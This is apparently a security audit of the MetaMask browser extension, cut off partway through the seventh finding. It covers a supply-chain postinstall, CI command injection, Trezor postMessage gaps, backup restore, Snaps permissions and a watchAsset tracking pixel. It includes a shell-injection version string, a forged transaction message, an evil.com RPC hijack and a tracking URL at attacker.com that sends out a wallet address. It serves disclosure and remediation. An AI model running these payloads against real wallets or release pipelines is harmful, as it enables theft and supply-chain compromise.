# MetaMask Extension Security Audit Report

## Metadata

| Field      | Value                                                    |
|------------|----------------------------------------------------------|
| Target     | MetaMask Browser Extension v13.34.0                     |
| Commit     | 4e88c336                                                 |
| Date       | 2026-05-22                                               |
| Auditor    | AutoFyn Security                                         |
| Scope      | Supply chain, browser extension runtime, Trezor integration, CI toolchain, backup/restore, Snaps permission system, wallet_watchAsset image handling, CAIP multichain API routing, PPOM/Blockaid middleware, ENS resolution, Snap UI image rendering, IPFS gateway configuration |

---

## Executive Summary

Twelve security vulnerabilities were identified and confirmed in MetaMask browser
extension v13.34.0 (commit 4e88c336). Three are rated High, seven Medium, and two
Low, spanning the supply chain, CI toolchain, Trezor integration,
backup/restore subsystem, Snaps permission system, wallet_watchAsset image
handling, CAIP multichain API routing, PPOM/Blockaid middleware, ENS resolution,
Snap UI image rendering, and IPFS gateway configuration.
VULN-6 was downgraded from High to Medium after verifying that secondary
enforcement exists in the `@metamask/snaps-rpc-methods` handler layer.
VULN-10 was downgraded from High to Medium after correcting the CVSS I:H to I:L
(the hash is the by-design ZeroNet site ID). VULN-12 was downgraded from Medium
to Low after aligning the CVSS C:H to C:L to match the documented impracticality.

| ID     | Title                                                          | Severity | CVSS 3.1 | Status                            |
|--------|----------------------------------------------------------------|----------|----------|-----------------------------------|
| VULN-1 | Supply Chain RCE via Unpinned Postinstall                      | High     | 8.1      | CONFIRMED                         |
| VULN-2 | Insecure postMessage in Trezor USB Page                        | Low      | 3.1      | CONFIRMED**                       |
| VULN-3 | Trezor Content Script Message Injection                        | Medium   | 4.2      | CONFIRMED*                        |
| VULN-4 | Command Injection in CI Beta Release Script                    | High     | 8.2      | CONFIRMED                         |
| VULN-5 | Unvalidated Backup Restore Accepts Malicious Config            | Medium   | 6.3      | CONFIRMED                         |
| VULN-6 | Snap WebSocket Methods Listed as Unrestricted                  | Medium   | 4.2      | CONFIRMED (defense-in-depth gap)  |
| VULN-7 | wallet_watchAsset IP Tracking Pixel (Privacy Leak)             | Medium   | 6.5      | CONFIRMED                         |
| VULN-8 | Phishing Detection Bypass via CAIP Multichain API              | High     | 8.1      | CONFIRMED                         |
| VULN-9 | Blockaid/PPOM Security Analysis Bypass via SIWE Detection      | Medium   | 6.5      | CONFIRMED‡                        |
| VULN-10 | ZeroNet ENS Contenthash Open Redirect to Localhost            | Medium   | 4.7      | CONFIRMED*†                       |
| VULN-11 | Unsanitized SVG in Snap UI Image Component                    | Medium   | 4.4      | CONFIRMED (defense-in-depth gap)  |
| VULN-12 | IPFS Gateway Accepts Loopback/Private Network Addresses       | Low      | 3.1      | CONFIRMED                         |

*VULN-3 has a partial mitigation in the background script (see finding detail).
**VULN-2 confirmed as code pattern; current exploitability limited by mitigating factors (see finding detail).
‡VULN-9: SIWE bypass confirmed in MetaMask extension source; `detectSIWE()` parsing behavior depends on `@metamask/controller-utils` (not decompiled for this audit).
†VULN-10: The ZeroNet redirect to localhost:43110 is an intentional design decision (CHANGELOG: "Add support for ZeroNet #7038"). The finding concerns the lack of validation on the `hash` and path components forwarded to the localhost endpoint, not the redirect itself. Classified as CWE-601 (URL Redirection / Open Redirect); `browser.tabs.update()` is a client-side redirect, not SSRF (CWE-918).

**Overall risk:** The supply chain finding (VULN-1) and CI command injection (VULN-4)
both present the highest risk to the release pipeline. **VULN-8 is the most critical new
finding**: a phishing site can bypass MetaMask's phishing detection entirely by using the
CAIP multichain API. On Chrome MV3, `externally_connectable` matches `["http://*/*",
"https://*/*"]` — any website on any domain can connect via `chrome.runtime.connect()` to
the CAIP path which has no phishing check. On Firefox/MV2, the `window.postMessage` path
opens a CAIP stream independently after `connectEip1193` — even if the EIP-1193 phishing
check fires, the CAIP stream still opens. VULN-7 (tracking pixel) allows any connected
dApp to fingerprint a user's IP address before they approve or reject a token watch
request. VULN-9 allows malicious SIWE-formatted messages to bypass Blockaid security
analysis. VULN-10 exposes a validation gap in ENS zeronet contenthash resolution: the
`hash` and user-supplied path components are forwarded to `http://127.0.0.1:43110/` with
no validation, though the localhost redirect itself is intentional design (CWE-601 open
redirect, not SSRF — `browser.tabs.update()` is a client-side redirect). VULN-11 is a
defense-in-depth gap where Snap-provided SVG content is embedded without sanitization —
not currently exploitable via `<img>` context but fragile if the rendering context changes.
VULN-12 is primarily a code-quality concern: the IPFS gateway setting accepts loopback and
private addresses without validation, but practical exploitation is constrained by HTTPS
and subdomain DNS requirements. VULN-6 is a defense-in-depth gap rather than an active
bypass. VULN-2 and VULN-3 are Trezor integration gaps. VULN-5 requires user interaction
but allows complete configuration hijacking via social engineering.

---

## Methodology

1. **Static analysis** of source code using grep, AST inspection, and manual
   review of critical paths.
2. **Dynamic testing** inside an isolated Docker environment using
   `node:22-bookworm@sha256:1031993481795705055273f2eef0c24597abdcb277d6e058c82f78cbbdef92a6`.
3. **Proof-of-concept exploit development** with reproducible scripts:
   - VULN-1: Dynamically confirmed against the actual `skills-postinstall.ts`
     code by substituting the upstream URL and observing payload delivery.
   - VULN-2 and VULN-3: Confirmed via static code analysis + behavioral
     simulation. The vulnerability patterns are verified in the source and
     the message handling logic is simulated in Node.js. Full browser-based
     testing was not performed for these findings.
4. **Honesty constraint:** No vulnerability was overstated. Where mitigating
   factors exist, they are documented in the finding.

---

## Findings

---

### VULN-1: Supply Chain RCE via Unpinned Postinstall Script

| Field          | Detail                                                                                 |
|----------------|----------------------------------------------------------------------------------------|
| ID             | VULN-1                                                                                 |
| Severity       | **High**                                                                               |
| CVSS 3.1       | **8.1** — AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H                                        |
| Affected Files | `development/skills-postinstall.ts` (line 19), `package.json` (line 20)               |
| Commit         | 4e88c336                                                                               |
| PoC Script     | `exploits/vuln1_supply_chain_rce.sh`                                                   |

#### Description

The `postinstall` hook in `package.json` (line 20) unconditionally runs
`tsx development/skills-postinstall.ts` as part of every `yarn install`. This
script clones `https://github.com/MetaMask/skills.git` at the **unpinned**
`origin/main` branch into `.skills-cache/metamask-skills/`:

```typescript
// development/skills-postinstall.ts, line 19
const PUBLIC_REPO = 'https://github.com/MetaMask/skills.git';

// Line 100 — clone invocation:
const clone = run(
  'git',
  ['clone', '--depth', '1', '--branch', 'main', PUBLIC_REPO, CACHE_DIR],
  spawn,
);
```

There is no commit hash pinning, no GPG signature verification, and no
checksum validation of the cloned content. Any attacker who can control what
`https://github.com/MetaMask/skills.git` serves on the `main` branch will have
their content pulled onto every developer's machine that runs `yarn install`.

The `.yarnrc.yml` file includes `enableScripts: false` with the
`yarn-plugin-allow-scripts` plugin, but the `$root$` package (the repo itself)
is in the allowlist and **the postinstall runs on every `yarn install`**.

#### Attack Vector

1. Attacker compromises the MetaMask/skills GitHub repository
   (account takeover, GitHub Actions misconfiguration, or maintainer credential
   compromise).
2. Attacker pushes malicious files to the `main` branch of `MetaMask/skills`.
   The files can be shell scripts, CI configuration, or any executable content.
3. Any MetaMask developer running `yarn install` will clone the poisoned
   repository.
4. The cloned files are placed under `.skills-cache/metamask-skills/` where
   they can be loaded by `yarn skills` and any CI pipeline that reads this
   cache directory.

Note: git over HTTPS uses TLS, which protects the clone from network-level
MITM. The primary attack vector is compromise of the upstream repository itself.

#### Impact

- **RCE on developer machines:** Arbitrary files placed in the skills cache can
  be loaded and executed by CI/CD pipelines, editor integrations, and developer
  scripts that consume the skills directory.
- **Supply chain pivot:** A compromised developer machine can be used to inject
  malicious code into MetaMask itself before it is signed and published.
- **Persistent foothold:** The `.skills-cache/` directory is unlikely to be
  audited; a compromised cache persists until explicitly cleared.

#### Reproduction Steps

```bash
# From the audit directory:
./setup.sh
./exploits/vuln1_supply_chain_rce.sh
```

The script:
1. Creates a mock "malicious" git repository inside the container.
2. Modifies `skills-postinstall.ts` to use `file:///tmp/mock-skills-repo` in
   place of the real GitHub URL.
3. Removes any existing `.skills-cache/` to force the clone path.
4. Runs the postinstall with `SKILLS_FORCE_POSTINSTALL=1`.
5. Verifies `COMPROMISED` marker file was delivered without any integrity check.

#### Remediation

1. **Pin to a specific commit hash:** Replace `--branch main` with
   `--depth 1 <commit-sha>` and verify the hash against a checked-in allowlist.
2. **Verify commit signatures:** Require GPG-signed commits and verify the
   signature after clone.
3. **Add checksum verification:** After cloning, verify a `sha256sums.txt` file
   (checked into the main repo) against the cloned content.
4. **Consider vendoring:** Use a git submodule with a pinned commit so the
   skills content is audited as part of the main repo review process.
5. **Least privilege:** Restrict what files from the skills cache are executable
   or loaded by CI scripts.

---

### VULN-2: Insecure postMessage Handling in Trezor USB Permissions Page

| Field          | Detail                                                              |
|----------------|---------------------------------------------------------------------|
| ID             | VULN-2                                                              |
| Severity       | **Low**                                                             |
| CVSS 3.1       | **3.1** — AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N                     |
| Affected Files | `app/vendor/trezor/usb-permissions.js` (lines 39-48)               |
| Commit         | 4e88c336                                                            |
| PoC Script     | `exploits/vuln2_extension_id_leak.sh`                               |
| PoC Page       | `exploits/vuln2_exploit_page.html`                                  |

#### Description

The Trezor USB permissions page (`trezor-usb-permissions.html`) loads
`app/vendor/trezor/usb-permissions.js`, which contains a `window.addEventListener('message', ...)` handler with two code quality weaknesses:

**Weakness A — No `event.origin` check (line 39):**
```javascript
window.addEventListener('message', event => {
  // No: if (event.origin !== 'https://connect.trezor.io') return;
  if (event.data === 'usb-permissions-init') {
```

The handler processes any incoming `'usb-permissions-init'` message without
verifying its origin.

**Weakness B — Wildcard `targetOrigin` when sending extension ID (lines 42-45):**
```javascript
      iframe.contentWindow.postMessage({
          type: 'usb-permissions-init',
          extension: chrome.runtime.id,
      }, '*');  // targetOrigin should be 'https://connect.trezor.io'
```

The reply containing `chrome.runtime.id` is sent to the iframe's content window
with `targetOrigin: '*'`. This means the message will be delivered regardless of
the iframe's current origin. If the iframe were redirected (e.g., via XSS or
CDN compromise of `connect.trezor.io`), the attacker's page running inside the
iframe would receive the extension ID.

**Note:** `postMessage` is point-to-point — it is sent TO `iframe.contentWindow`,
not broadcast to all windows. Only the content within the iframe receives the
message. The `'*'` wildcard means the message is accepted by the iframe
regardless of its origin, not that all frames on the page receive it.

#### Mitigating Factors

1. **Page is not web-accessible:** `trezor-usb-permissions.html` is NOT listed
   in `web_accessible_resources` in either the MV2 or MV3 manifest. External
   web pages cannot navigate to, embed, or open this extension page. Only the
   extension itself can open it.
2. **MetaMask's extension ID is publicly known:** The Chrome Web Store extension
   ID (`nkbihfbeogaeaoehlefnkodbefgpgknn`) is public. Leaking it provides
   limited additional value for an attacker.
3. **Requires iframe compromise:** The actual recipient of the extension ID is
   the iframe at `connect.trezor.io`. An attacker would need to compromise
   `connect.trezor.io` (via XSS, CDN compromise, or DNS hijacking) to capture
   the extension ID from within the iframe.

#### Attack Vector (requires connect.trezor.io compromise)

1. Victim opens MetaMask and initiates a Trezor hardware wallet flow,
   which opens `chrome-extension://<id>/trezor-usb-permissions.html`.
2. The page embeds `https://connect.trezor.io/9/extension-permissions.html`
   in an iframe.
3. If an attacker has achieved code execution within the iframe (via XSS on
   connect.trezor.io, CDN compromise, or DNS hijacking), their code listens
   for the `postMessage` reply.
4. The iframe sends `'usb-permissions-init'` to the parent (normal flow).
5. The parent sends `{ extension: chrome.runtime.id }` to the iframe with
   `targetOrigin: '*'`.
6. The attacker's code running inside the iframe captures `chrome.runtime.id`.

#### Impact

- **Defense-in-depth violation:** The lack of origin validation and use of
  wildcard targetOrigin violates secure postMessage practices, even if current
  exploitability is limited by the iframe being loaded from a trusted origin.
- **Sideloaded extension fingerprinting:** For sideloaded/development builds
  where the extension ID is randomized (not the Chrome Web Store version),
  the leaked ID enables targeted tracking.
- **Future risk:** If the page were ever added to `web_accessible_resources`
  or if `connect.trezor.io` is compromised, the vulnerability becomes directly
  exploitable.

#### Reproduction Steps

```bash
./setup.sh
./exploits/vuln2_extension_id_leak.sh
```

The script performs static analysis verifying both vulnerability patterns exist
in the source code, then runs a simulation demonstrating the message flow.

#### Remediation

1. **Validate `event.origin`:**
   ```javascript
   window.addEventListener('message', event => {
     if (event.origin !== 'https://connect.trezor.io') return;
     // ...
   });
   ```
2. **Use specific `targetOrigin`:**
   ```javascript
   iframe.contentWindow.postMessage(reply, 'https://connect.trezor.io');
   ```
3. **Validate `event.source`:** Verify the message came from the expected iframe
   element specifically, not just any window.

---

### VULN-3: Unrestricted Message Injection into Extension Background via Trezor Content Script

| Field            | Detail                                                                   |
|------------------|--------------------------------------------------------------------------|
| ID               | VULN-3                                                                   |
| Severity         | **Medium** (partially mitigated; would be High without mitigation)       |
| CVSS 3.1         | **4.2** — AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N                           |
| Affected Files   | `app/vendor/trezor/content-script.js` (lines 17-21)                     |
| Mitigating File  | `app/scripts/background.js` (lines 188, 1729-1732)                      |
| Commit           | 4e88c336                                                                 |
| PoC Script       | `exploits/vuln3_trezor_message_injection.sh`                             |
| PoC Page         | `exploits/vuln3_exploit_page.html`                                       |

#### Description

The Trezor content script (`app/vendor/trezor/content-script.js`) is injected
into all pages matching `*://connect.trezor.io/*/popup.html*`. It connects a
port named `trezor-connect` to the extension background and forwards all
`window.postMessage` events to the background without origin or schema
validation:

```javascript
// content-script.js lines 17-21 (VULNERABLE)
window.addEventListener('message', event => {
    // ONLY CHECK: event.source === window
    // NO event.origin CHECK <-- vulnerability
    // NO message schema validation <-- vulnerability
    if (port && event.source === window && event.data) {
        port.postMessage({ data: event.data });
    }
});
```

The guard `event.source === window` is trivially satisfied by any JavaScript
running in the same frame, including XSS-injected scripts.

#### Partial Mitigation

`background.js` line 188 declares:
```javascript
const metamaskBlockedPorts = ['trezor-connect'];
```

And `connectWindowPostMessage()` at line 1730 returns immediately for blocked
ports:
```javascript
connectWindowPostMessage = (remotePort, removeCriticalErrorListeners) => {
    if (metamaskBlockedPorts.includes(remotePort.name)) {
      return;
    }
    // ...
};
```

This causes the port to disconnect immediately upon `chrome.runtime.connect()`,
setting `port` to `null` in the content script. With `port === null`, the
`if (port && ...)` guard prevents message forwarding in practice.

#### Why This Still Matters

1. **Latent vulnerability:** The content script has no validation of its own.
   If the background port block is ever removed (future refactor, feature
   addition), the full attack is immediately re-enabled.
2. **Defense-in-depth gap:** A properly secured content script should not
   depend on the background to refuse connections for security. The content
   script should validate its own inputs.
3. **XSS on connect.trezor.io:** If an attacker achieves XSS on
   `connect.trezor.io`, they can call `window.postMessage()` from the same
   frame. Even without the port being live, the XSS context itself would allow
   direct DOM manipulation and user interaction capture.
4. **Third-party port consumers:** Other extensions or future Trezor SDK
   versions may register handlers for the `trezor-connect` port name.

#### Attack Vector (if mitigation absent)

1. Attacker achieves script execution on a page matching
   `*://connect.trezor.io/*/popup.html*` (via XSS, CDN compromise, or DNS
   hijacking).
2. Attacker calls:
   ```javascript
   window.postMessage({
     type: 'SIGN_TRANSACTION',
     payload: { to: '0xAttackerAddress', value: '1000000000000000000' }
   }, '*');
   ```
3. Content script forwards `{ data: { type: 'SIGN_TRANSACTION', ... } }` to
   the background port without validation.
4. If the background processes the message, the transaction is prepared with
   attacker-controlled parameters.

#### Reproduction Steps

```bash
./setup.sh
./exploits/vuln3_trezor_message_injection.sh
```

The script verifies the vulnerability patterns statically, confirms the
background-side mitigation exists, and runs a simulation proving that
the content script logic forwards arbitrary payloads without validation.

#### Remediation

1. **Add `event.origin` check in the content script:**
   ```javascript
   window.addEventListener('message', event => {
     if (event.origin !== 'https://connect.trezor.io') return;
     if (port && event.source === window && event.data) {
       port.postMessage({ data: event.data });
     }
   });
   ```
2. **Validate message schema:** Maintain an allowlist of valid message types
   before forwarding.
3. **Do not rely solely on the background port block:** Fix the content script
   independently of the background's connection policy.

---

---

### VULN-4: Command Injection in CI Beta Release Script

| Field          | Detail                                                                                 |
|----------------|----------------------------------------------------------------------------------------|
| ID             | VULN-4                                                                                 |
| Severity       | **High**                                                                               |
| CVSS 3.1       | **8.2** — AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N                                        |
| Affected Files | `development/generate-beta-commit.js` (lines 3, 26-30, 34-36)                         |
| Commit         | 4e88c336                                                                               |
| PoC Script     | `exploits/vuln4_command_injection.sh`                                                  |

#### Description

`development/generate-beta-commit.js` uses `promisify(require('child_process').exec)`
(line 3), which passes its argument to `/bin/sh -c`. The `VERSION` variable is
loaded from `package.json` without sanitization (line 4) and interpolated into
shell commands via template literals.

The vulnerable else-branch (lines 27-31) executes when the version string does
NOT contain the substring `"beta"`:

```javascript
// generate-beta-commit.js lines 27-31
} else {
  betaVersion = `${VERSION}-beta.0`;
  // change package.json version to beta-0
  await exec(`yarn version ${betaVersion}`);
}
```

If `package.json` contains `"version": "1.0.0$(touch /tmp/vuln4-pwned)"`, the
else-branch evaluates to:

```
exec('yarn version 1.0.0$(touch /tmp/vuln4-pwned)-beta.0')
```

`/bin/sh -c` interprets `$()` as command substitution, executing
`touch /tmp/vuln4-pwned` before `yarn` is invoked. The injection succeeds even
if `yarn` fails, because `exec()` evaluates the full shell command.

Additionally, the git commit step at line 34 also interpolates `betaVersion`:

```javascript
await exec(`git add . && git commit -m "Version v${betaVersion}" && git push`);
```

Any shell metacharacter surviving to this line would also be executed.

#### Mitigating Factors

- An attacker must get a malicious `package.json` version string into the
  codebase — this requires a PR review bypass, a compromised maintainer account,
  or a supply chain compromise of a dependency that writes to `package.json`.
- `generate-beta-commit.js` is only executed during the beta release CI flow,
  not on every `yarn install`.
- AC:H (High complexity) reflects that social engineering or account compromise
  is required.

#### Impact

The CI environment that runs `generate-beta-commit.js` holds:
- **npm publishing tokens** used to release MetaMask to millions of users
- **Release signing keys** used to authenticate extension builds
- **GitHub deployment credentials** with write access to the main repository

Arbitrary command execution in this environment allows an attacker to:
1. Publish a malicious MetaMask version to the Chrome Web Store and npm
2. Exfiltrate signing keys for use in future attacks
3. Inject backdoors into release artifacts before they are signed

#### Reproduction Steps

```bash
# From the audit directory:
./setup.sh
./exploits/vuln4_command_injection.sh
```

The script:
1. Creates a git workspace inside the container with a crafted `package.json`.
2. Sets `"version": "1.0.0$(touch /tmp/vuln4-pwned)"` — no "beta" substring,
   triggering the else-branch.
3. Copies and minimally patches `generate-beta-commit.js` (require path only).
4. Creates a mock `yarn` in PATH that exits 0.
5. Runs the script with `|| true` since `git push` will fail (no remote).
6. Verifies `/tmp/vuln4-pwned` was created by the injected command.

#### Remediation

1. **Use `execFile()` or `spawn()` with argument arrays:**
   ```javascript
   const { execFile } = require('child_process');
   const execFileAsync = promisify(execFile);
   await execFileAsync('yarn', ['version', betaVersion]);
   ```
   These do not invoke a shell and cannot interpret `$()` or other metacharacters.

2. **Validate the version string before interpolation:**
   ```javascript
   if (!/^\d+\.\d+\.\d+(-beta\.\d+)?$/.test(VERSION)) {
     throw new Error(`Invalid version string: ${VERSION}`);
   }
   ```

3. **Pin CI to a read-only copy of package.json:** The script should not trust
   the version field without validating it against an allowlist pattern.

---

### VULN-5: Unvalidated Backup Restore Accepts Malicious Configuration

| Field          | Detail                                                                                 |
|----------------|----------------------------------------------------------------------------------------|
| ID             | VULN-5                                                                                 |
| Severity       | **Medium**                                                                             |
| CVSS 3.1       | **6.3** — AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N                                        |
| Affected Files | `app/scripts/lib/backup.js` (lines 20-45)                                             |
|                | `app/scripts/metamask-controller.js` (line 3763)                                      |
| Commit         | 4e88c336                                                                               |
| PoC Script     | `exploits/vuln5_backup_restore_hijack.sh`                                              |

#### Description

`restoreUserData(jsonString)` in `app/scripts/lib/backup.js` (lines 20-45)
parses arbitrary JSON and passes the result directly to four controllers with
zero schema validation:

```javascript
// backup.js lines 20-45
async restoreUserData(jsonString) {
  const { preferences, addressBook, network, internalAccounts } =
    JSON.parse(jsonString);
  if (preferences) {
    this.preferencesController.update(preferences);        // no validation
  }
  if (addressBook) {
    this.addressBookController.update(addressBook, true);  // no validation
  }
  if (network) {
    this.networkController.loadBackup(network);            // no validation
  }
  if (internalAccounts) {
    this.accountsController.loadBackup(internalAccounts); // no validation
  }
  // ...
}
```

There is no URL allowlisting, no type checking, no schema enforcement, and no
validation that values such as `usePhishDetect` or RPC endpoint URLs are
semantically valid.

The function is exposed as an internal RPC method at `metamask-controller.js`
line 3763:

```javascript
restoreUserData: backup.restoreUserData.bind(backup),
```

#### Trust Boundary

**`restoreUserData` is accessible ONLY from the extension's own UI pages**
(popup, fullscreen settings). External dapps receive `setupUntrustedCommunication`
which provides only the EIP-1193 provider API — `restoreUserData` is not
accessible from external websites or dapps.

**The attack requires social engineering:** An attacker must convince the user
to import a malicious JSON file through the MetaMask backup restore UI, e.g.,
"Download this backup file to fix your MetaMask wallet." The user must navigate
to the backup restore settings page and explicitly import the file.

#### Impact

A crafted backup JSON can simultaneously:

1. **Hijack RPC endpoints:** Set `network.networkConfigurationsByChainId` to
   point Ethereum Mainnet to `attacker-rpc.evil.com`. All transaction broadcasts,
   balance queries, and state reads are then routed through the attacker's server.

2. **Poison the address book:** Insert fake entries that display trusted names
   (e.g., "Coinbase: Hot Wallet") mapped to attacker-controlled addresses.
   The user may send funds to the attacker when selecting a saved contact.

3. **Disable phishing detection:** Set `preferences.usePhishDetect: false`,
   removing the primary protection against phishing sites.

4. **Corrupt account selection:** Set `internalAccounts.selectedAccount` to
   an attacker-controlled identifier, potentially causing the wallet to display
   a different account than the one the user expects to be active.

#### Reproduction Steps

```bash
# From the audit directory:
./setup.sh
./exploits/vuln5_backup_restore_hijack.sh
```

The script:
1. Verifies `restoreUserData` is exposed at `metamask-controller.js:3763`.
2. Confirms lines 20-45 of `backup.js` contain no validation logic.
3. Checks that `backup.test.js` has no negative test cases for malicious input.
4. Reproduces the `Backup` class in CommonJS (faithful to the original logic,
   avoiding ESM import issues).
5. Calls `restoreUserData()` with a malicious payload.
6. Verifies all four controllers received the attacker-controlled values.

#### Remediation

1. **Validate RPC endpoint URLs:**
   ```javascript
   const ALLOWED_RPC_PATTERNS = [/^https:\/\/.+\.infura\.io\//, /^https:\/\/.+\.alchemyapi\.io\//];
   // Reject any endpoint not matching the allowlist
   ```

2. **Add JSON schema validation:** Use a schema library (e.g., `superstruct`,
   `zod`, or `ajv`) to validate the structure and value types before writing
   to any controller.

3. **Protect security-critical preferences:** Explicitly disallow setting
   `usePhishDetect: false` via the backup restore path.

4. **Restrict the import format:** Only accept backup files generated by
   MetaMask's own `backupUserData()` function — add a version field and
   validate its structure strictly.

---

### VULN-6: Snap WebSocket Methods Listed as Unrestricted (Defense-in-Depth Gap)

| Field          | Detail                                                                                 |
|----------------|----------------------------------------------------------------------------------------|
| ID             | VULN-6                                                                                 |
| Severity       | **Medium**                                                                             |
| CVSS 3.1       | **4.2** — AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N                                        |
| Affected Files | `app/scripts/controllers/permissions/specifications.ts` (lines 201-204)               |
|                | `app/scripts/messenger-client-init/snaps/websocket-service-init.ts`                   |
| Commit         | 4e88c336                                                                               |
| PoC Script     | `exploits/vuln6_snap_websocket_bypass.sh`                                              |

#### Description

MetaMask's permission system distinguishes between two categories of methods:

- **Restricted methods** — require explicit user approval (shown at Snap install time)
- **Unrestricted methods** — the permission middleware calls `next()` without any check

The `endowment:network-access` permission is the intended gate for Snap network
access. When a Snap declares it, users see **"Access the internet"** at install
time (as rendered by `ui/helpers/utils/permission.js:318`).

`snap_openWebSocket`, `snap_sendWebSocketMessage`, `snap_closeWebSocket`,
and `snap_getWebSockets` are listed in the `unrestrictedMethods` array at
`specifications.ts` lines 201-204:

```typescript
// specifications.ts lines 201-204
'snap_openWebSocket',
'snap_sendWebSocketMessage',
'snap_closeWebSocket',
'snap_getWebSockets',
```

Because these methods are listed as unrestricted, the MetaMask extension's
permission middleware does not check `endowment:network-access` for these calls.
The `WebSocketService` initialized at `websocket-service-init.ts` is constructed
with only a `messenger` argument and contains no permission check in the
init code visible in this repository.

#### Secondary Enforcement Confirmed

After verifying the `@metamask/snaps-rpc-methods@16.0.0` package source at a
pinned commit, secondary permission checks were found in ALL four WebSocket
method handlers. Verified from `github.com/MetaMask/snaps` at commit
`826159dc62bebb76cdb4dbba2573441d461d3bc7`:

```typescript
// packages/snaps-rpc-methods/src/permitted/openWebSocket.ts (~line 100)
if (!messenger.call('PermissionController:hasPermission', origin, SnapEndowments.NetworkAccess)) {
  return end(providerErrors.unauthorized());
}
```

The same `PermissionController:hasPermission` check is present in:
- `closeWebSocket.ts`
- `sendWebSocketMessage.ts`
- `getWebSockets.ts`

A Snap WITHOUT `endowment:network-access` is blocked at the handler layer before
the `WebSocketService` is ever called. This changes the classification from an
active bypass to a defense-in-depth gap.

The `WebSocketService` class itself (`WebSocketService.ts`) has no permission
check — it directly creates `new WebSocket(url, protocols)`. This means the
handler layer is the sole enforcement point, and if the handler-level check were
removed in a future refactor (or if a new method were added to `unrestrictedMethods`
without a corresponding handler check), the bypass would become active.

#### Impact

- **Currently not exploitable:** A Snap without `endowment:network-access` CANNOT
  open WebSockets — the handler-level check in `@metamask/snaps-rpc-methods`
  blocks the call before reaching `WebSocketService`.
- **Latent risk:** The `unrestrictedMethods` listing means no defense exists at
  the middleware layer. If the handler check is removed in a future refactor,
  or if a new WebSocket-adjacent method is added to `unrestrictedMethods` without
  a matching handler check, the bypass becomes immediately exploitable.
- **Defense-in-depth violation:** The permission middleware should be the
  authoritative gate, not the handler implementation. Users currently cannot
  distinguish between "this Snap has network access" and "this Snap might silently
  gain network access if a handler is changed."
- **PR:L** — An attacker would need to publish a Snap and convince a user to
  install it. The current handler enforcement blocks exploitation.

#### Reproduction Steps

```bash
# From the audit directory:
./setup.sh
./exploits/vuln6_snap_websocket_bypass.sh
```

The script:
1. Extracts all `snap_*WebSocket*` method names from `specifications.ts` and
   confirms they appear in the `unrestrictedMethods` array.
2. Confirms `endowment:network-access` is a restricted endowment permission in
   `shared/constants/snaps/permissions.ts`.
3. Shows the user-facing "Access the internet" text that is only shown when
   `endowment:network-access` is declared.
4. Reads `websocket-service-init.ts` and confirms no secondary permission check.
5. Confirms `ExcludedSnapPermissions` is empty (no snap permissions are excluded).
6. Runs a Node.js simulation that parses the actual `specifications.ts` to confirm
   `snap_openWebSocket` is in `unrestrictedMethods` and demonstrates that a
   Snap manifest without `endowment:network-access` would still pass the middleware.

#### Remediation

1. **Move WebSocket methods to restricted methods gated by `endowment:network-access`:**
   Remove `snap_openWebSocket`, `snap_sendWebSocketMessage`, `snap_closeWebSocket`,
   and `snap_getWebSockets` from the `unrestrictedMethods` array. These methods
   establish external network connections and must require the same user approval
   as `fetch` and other network operations.

2. **Add a secondary permission check in `WebSocketService`:**
   Before opening a WebSocket, verify the requesting Snap has the
   `endowment:network-access` permission:
   ```typescript
   const hasPermission = await messenger.call(
     'PermissionController:hasPermission', snapId, 'endowment:network-access'
   );
   if (!hasPermission) throw new Error('Snap does not have network-access permission');
   ```

3. **Audit all other `snap_*` methods** in `unrestrictedMethods` for similar
   capability grants that should require user-visible permissions.

---

---

### VULN-7: wallet_watchAsset Pre-Approval Tracking Pixel

| Field          | Detail                                                                                 |
|----------------|----------------------------------------------------------------------------------------|
| ID             | VULN-7                                                                                 |
| Severity       | **Medium**                                                                             |
| CVSS 3.1       | **6.5** — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N                                        |
| Affected Files | `app/scripts/lib/rpc-method-middleware/handlers/watch-asset.ts` (line 69)             |
|                | `app/scripts/metamask-controller.js` (line 6788)                                      |
|                | `ui/pages/confirm-add-suggested-token/confirm-add-suggested-token.js` (line 214)      |
| Commit         | 4e88c336                                                                               |
| PoC Script     | `exploits/vuln7_watchasset_tracking.sh`                                                |

#### Description

The `wallet_watchAsset` RPC method (EIP-747) accepts an `image` field in the
asset descriptor with no URL validation. The image is rendered in the
confirmation dialog via `<AvatarToken src={asset.image}>` **before the user
clicks Approve or Cancel.** The extension CSP (both MV2 and MV3) has no
`img-src` directive, so the browser applies no image-loading restriction.

#### Code Path

**Step 1 — Handler (`watch-asset.ts:69`)** destructures the asset without
touching the `image` field:

```typescript
// watch-asset.ts lines 65-70
const { options: asset, type } = params;
// asset.image is destructured and passed through — no validation
```

**Step 2 — Storage (`metamask-controller.js:6788`)** stores the URL verbatim:

```javascript
// metamask-controller.js:6788
const iconUrl = asset.image ?? asset.iconUrl;
// iconUrl is stored in pendingMetadata with no URL sanitization
```

The `#validateUnifiedWatchAssetRequest` function (lines 6716-6756) validates
only: `assetsController` existence, `networkClientId`, `chainId`, `address`,
and `decimals`. It does **not** reference `image` or `iconUrl` at any point.

**Step 3 — Rendering (`confirm-add-suggested-token.js:214`)** passes the URL
directly to `AvatarToken`:

```jsx
// confirm-add-suggested-token.js:214
<AvatarToken
  size={AvatarTokenSize.Xl}
  src={asset.image}
  name={getTokenName(asset.name, asset.symbol)}
/>
```

`AvatarToken` renders this as `<img src="...">`. The browser sends an HTTP GET
to the URL when the dialog opens — before any user interaction.

**Step 4 — No CSP restriction.** The MV3 `extension_pages` CSP is:

```
script-src 'self' 'wasm-unsafe-eval'; object-src 'none'; frame-ancestors 'none'; font-src 'self';
```

There is no `img-src` directive. The MV2 CSP is similarly absent of `img-src`.
Without an explicit `img-src`, browsers apply the `default-src` fallback — but
no `default-src` is set either, so images load from any origin without
restriction.

#### Attack Vector

1. A dApp that has obtained provider access (user has connected their wallet
   to the site) calls:
   ```javascript
   ethereum.request({
     method: 'wallet_watchAsset',
     params: {
       type: 'ERC20',
       options: {
         address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
         symbol: 'USDC',
         decimals: 18,
         image: 'https://attacker.com/track?wallet=0x1234&ts=' + Date.now(),
       },
     },
   });
   ```
